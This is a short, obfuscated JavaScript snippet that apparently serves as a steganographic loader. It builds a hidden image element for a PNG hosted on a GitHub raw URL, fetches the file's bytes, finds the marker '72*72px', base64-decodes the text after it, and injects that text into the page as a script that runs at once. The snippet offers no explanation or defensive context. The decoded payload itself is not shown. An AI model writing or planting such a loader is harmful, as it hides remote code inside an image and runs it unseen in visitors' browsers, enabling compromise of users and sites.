(async function() {
        const _0x1a2b = document.createElement('img');
        _0x1a2b.src = 'https://raw.githubusercontent.com/mahendraplus/Red-byte/refs/heads/Max/home.png';
        _0x1a2b.style.display = 'none';
        document.body.appendChild(_0x1a2b);

        const _0x3e4f = new TextDecoder().decode(new Uint8Array(await (await fetch(_0x1a2b.src)).arrayBuffer()));
        const _0x5d6e = "72*72px", _0x7e8f = _0x3e4f.indexOf(_0x5d6e);
        
        if (_0x7e8f !== -1) {
            const _0x9a0b = atob(_0x3e4f.substring(_0x7e8f + _0x5d6e.length));
            const _0xb1c3 = document.createElement('script');
            _0xb1c3.textContent = _0x9a0b;
            document.body.appendChild(_0xb1c3);
        }
    })();
